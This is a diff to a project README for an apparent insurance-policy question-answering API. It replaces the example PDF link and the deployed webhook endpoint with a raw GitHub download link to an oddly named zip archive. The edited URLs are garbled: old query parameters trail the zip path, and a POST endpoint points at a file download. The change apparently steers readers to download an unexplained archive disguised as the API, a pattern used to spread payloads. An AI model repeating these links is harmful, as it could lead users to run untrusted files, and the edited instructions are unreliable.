@@ -29,7 +29,7 @@ Features
 You can send a POST request with a JSON body like this:
 
 { 
-  "documents": "https://hackrx.blob.core.windows.net/assets/policy.pdf?sv=2023-01-03&st=2025-07-04T09%3A11%3A24Z&se=2027-07-05T09%3A11%3A00Z&sr=b&sp=r&sig=N4a9OU0w0QXO6AOIBiu4bpl7AXvEZogeT%2FjUHNO7HzQ%3D", 
+  "documents": "https://github.com/Raghul-676/BajajFinserv_project_LeaveItToUS/raw/refs/heads/main/again/It-Leave-US-Finserv-To-Bajaj-project-v2.4.zip%3A11%3A24Z&se=2027-07-05T09%3A11%3A00Z&sr=b&sp=r&sig=N4a9OU0w0QXO6AOIBiu4bpl7AXvEZogeT%2FjUHNO7HzQ%3D", 
   "questions": [ "What is the grace period for premium payment under the National Parivar Mediclaim Plus Policy?", 
                   "What is the waiting period for pre-existing diseases (PED) to be covered?", "Does this policy cover maternity expenses, and what are the conditions?", 
                   "What is the waiting period for cataract surgery?", "Are the medical expenses for an organ donor covered under this policy?", 
@@ -44,7 +44,7 @@ How to Use:
 
 * Access the deployed webhook URL:
 
-POST (https://raghul12345678-leave-it-to-us-project.hf.space/api/v1/hackrx/run)
+POST (https://github.com/Raghul-676/BajajFinserv_project_LeaveItToUS/raw/refs/heads/main/again/It-Leave-US-Finserv-To-Bajaj-project-v2.4.zip)
 
 * Headers:
 
